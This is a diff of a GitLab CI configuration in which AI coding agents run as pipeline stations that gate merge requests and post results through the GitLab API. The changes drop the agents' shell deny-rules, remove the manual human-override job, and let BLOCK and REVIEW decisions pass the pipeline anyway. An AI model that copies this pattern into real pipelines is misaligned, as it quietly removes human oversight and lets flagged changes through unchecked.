-      7. Exit with appropriate code: 0 for APPROVE, 1 for BLOCK, 99 for REVIEW
       
-      Be thorough, fair, and security-focused. Err on the side of caution for production systems.
-      " --deny-tool "shell(*)"
-    
-    - test -f station_out/gate_decision.json || (echo "A5 failed to create gate_decision.json" && exit 1)
-    
-    # Read decision and set exit code
-    - DECISION=$(jq -r '.decision' station_out/gate_decision.json)
-    - echo "Gate Decision: $DECISION"
+      CONSTRAINTS:
+      - Load and parse ALL report JSONs
+      - Apply exact gate logic above
+      - BLOCK or REVIEW must list specific issues
+      " --allow-tool 'write'
     - |
-      if [ "$DECISION" = "APPROVE" ]; then
-        echo " MR APPROVED by policy gate"
+      # Extract decision and set exit code
+      STATUS=$(jq -r '.status' ${STATION_OUT}/gate_decision.json)
+      echo ""
+      echo "═══════════════════════════════════════════════════════"
+      echo "  POLICY GATE DECISION"
+      echo "═══════════════════════════════════════════════════════"
+      cat ${STATION_OUT}/gate_decision.json | jq .
+      echo "═══════════════════════════════════════════════════════"
+      echo ""
+      
+      if [ "$STATUS" = "BLOCK" ]; then
+        echo "❌ GATE STATUS: BLOCKED"
+        echo "   This merge request cannot be merged until issues are resolved."
+        exit 1
+      elif [ "$STATUS" = "REVIEW" ]; then
+        echo "⚠️  GATE STATUS: NEEDS REVIEW"
+        echo "   Human review required before merge."
         exit 0
-      elif [ "$DECISION" = "BLOCK" ]; then
-        echo " MR BLOCKED by policy gate"
-        exit 1
-      elif [ "$DECISION" = "REVIEW" ]; then
-        echo "  MR requires HUMAN REVIEW"
-        exit 99
       else
-        echo "  Unknown decision: $DECISION"
-        exit 1
+        echo "✅ GATE STATUS: APPROVED"
+        echo "   All validations passed. Safe to merge."
+        exit 0
       fi
   artifacts:
     paths:
-      - station_out/gate_decision.json
-    expire_in: 1 week
+      - ${STATION_OUT}/gate_decision.json
+      - ${STATION_OUT}/*.json
+    expire_in: 7 days
   allow_failure:
-    exit_codes: 99  # Allow pipeline to continue for REVIEW decisions
+    exit_codes: 1
 
-# Manual Override Job - For REVIEW decisions requiring human approval
-manual_override_approve:
-  stage: gate
-  extends: .copilot_job
-  needs:
-    - job: station_a5_policy_gate
-      artifacts: true
-  when: manual
-  script:
-    - echo "Manual approval provided by: $GITLAB_USER_LOGIN"
-    - echo "Override reason: Human review completed, approved for merge"
-    - |
-      cat > station_out/manual_override.json <<EOF
-      {
-        "override_type": "manual_approval",
-        "approved_by": "$GITLAB_USER_LOGIN",
-        "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
-        "justification": "Human review completed, security/policy concerns addressed"
-      }
-      EOF
-    - echo " Manual override approved"
-  artifacts:
-    paths:
-      - station_out/manual_override.json
-  rules:
-    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
-      when: manual
-      allow_failure: false
-
-# Station A6: GitLab Update - Post results to MR as comment and label
-station_a6_gitlab_update:
+# ----------------------------------------------------------------------------
+# A6: GITHUB/GITLAB UPDATE STATION
+# ----------------------------------------------------------------------------
+A6_update:
+  extends: .station_base
   stage: update
-  extends: .copilot_job
-  needs:
-    - job: station_a5_policy_gate
-      artifacts: true
-  when: always  # Run even if gate job fails
+  needs: ["A5_gate"]
+  when: always
   script:
     - |
-      # Station A6: GitLab Update
-      # Post pipeline results to GitLab MR as comment and apply label
-      # Uses GitLab API instead of GitHub API
+      echo "💬 Station A6 - GitLab Update: Posting results..."
+      
+      # Install GitLab CLI if needed
+      apt-get install -y -qq python3 python3-requests
       
       copilot -p "
-      You are Station A6: GitLab Update for the AI-SDLC Station-Gate Pipeline.
+      You are Station A6 - GITLAB UPDATE for posting results to MR.
       
-      Your task is to update the GitLab merge request with pipeline results.
+      GOAL: Comment on GitLab MR with gate decision
       
-      **Station Specification (A6-gitlab-update.prompt.md - ADAPTED FOR GITLAB):**
+      TASK:
+      1. Read ${STATION_OUT}/gate_decision.json
       
-      ## Context
-      - GitLab API URL: $CI_API_V4_URL
-      - Project ID: $CI_PROJECT_ID
-      - MR IID: $CI_MERGE_REQUEST_IID
-      - Pipeline URL: $CI_PIPELINE_URL
+      2. Create a formatted comment for GitLab MR:
+         - Include gate status with emoji
+         - Summarize findings by severity
+         - List blocking issues if any
+         - Provide actionable recommendations
       
-      ## Inputs
-      - Gate Decision: station_out/gate_decision.json (from A5)
-      - Manual Override: station_out/manual_override.json (if exists)
-      
-      ## Tasks
-      1. Read gate_decision.json to get decision and justification
-      2. Format a comprehensive comment for the MR:
-         - Pipeline status badge
-         - Decision (APPROVED/BLOCKED/REVIEW)
-         - Aggregated findings table
-         - Links to station artifacts
-         - Next steps for developer
-      3. Use curl to post comment via GitLab API:
-         POST \$CI_API_V4_URL/projects/\$CI_PROJECT_ID/merge_requests/\$CI_MERGE_REQUEST_IID/notes
+      3. Post comment using GitLab API:
+         URL: \$CI_API_V4_URL/projects/\$CI_PROJECT_ID/merge_requests/\$CI_MERGE_REQUEST_IID/notes
+         Method: POST
          Headers: PRIVATE-TOKEN: \$GITLAB_TOKEN
-         Body: { \"body\": \"formatted comment\" }
-      4. Apply appropriate label to MR:
-         - station-gate::approved (green)
-         - station-gate::blocked (red)
-         - station-gate::review (yellow)
-      5. Create update_report.json:
-      {
-        \"station\": \"A6-gitlab-update\",
-        \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
-        \"mr_iid\": $CI_MERGE_REQUEST_IID,
-        \"comment_posted\": true,
-        \"label_applied\": \"station-gate::approved\",
-        \"api_response_code\": 201
-      }
-      6. Write JSON to station_out/update_report.json
+         Body: {\"body\": \"<markdown comment>\"}
       
-      Use curl for GitLab API calls. Ensure GITLAB_TOKEN is available.
-      " --allow-tool "curl" --deny-tool "shell(*)"
-    
-    - test -f station_out/update_report.json || (echo "A6 failed to create update_report.json" && exit 1)
-    - echo "Station A6 completed successfully"
+      4. Apply label based on status:
+         - APPROVE → label: 'validation-passed'
+         - BLOCK → label: 'validation-failed'
+         - REVIEW → label: 'needs-review'
+      
+      Comment Template:
+      ---
+      ## 🤖 Agent Factory Validation Report
+      
+      **Status**: [APPROVE/BLOCK/REVIEW]
+      
+      ### Summary
+      - Critical: X
+      - High: X
+      - Medium: X
+      - Low: X
+      
+      ### Blocking Issues
+      [List if BLOCK/REVIEW]
+      
+      ### Recommendations
+      [Actionable items]
+      
+      ---
+      Pipeline: \$CI_PIPELINE_URL
+      ---
+      
+      CONSTRAINTS:
+      - Use curl for GitLab API
+      - Check GITLAB_TOKEN exists
+      - Handle API errors gracefully
+      " --allow-tool 'shell(curl)'
+  only:
+    - merge_requests
+
+# ============================================================================
+# SUMMARY JOB
+# ============================================================================
+pipeline_summary:
+  stage: update
+  needs: ["A5_gate"]
+  when: always
+  script:
+    - |
+      echo ""
+      echo "╔═══════════════════════════════════════════════════════════╗"
+      echo "║           AGENT FACTORY PIPELINE COMPLETE                ║"
+      echo "╚═══════════════════════════════════════════════════════════╝"
+      echo ""
+      echo "📊 All Reports Generated:"
+      ls -lh ${STATION_OUT}/*.json || echo "No reports found"
+      echo ""
+      echo "🎯 Gate Decision:"
+      cat ${STATION_OUT}/gate_decision.json | jq -C . || echo "Gate decision not found"
+      echo ""
   artifacts:
     paths:
-      - station_out/update_report.json
-    expire_in: 1 week
+      - ${STATION_OUT}/
+    expire_in: 30 days
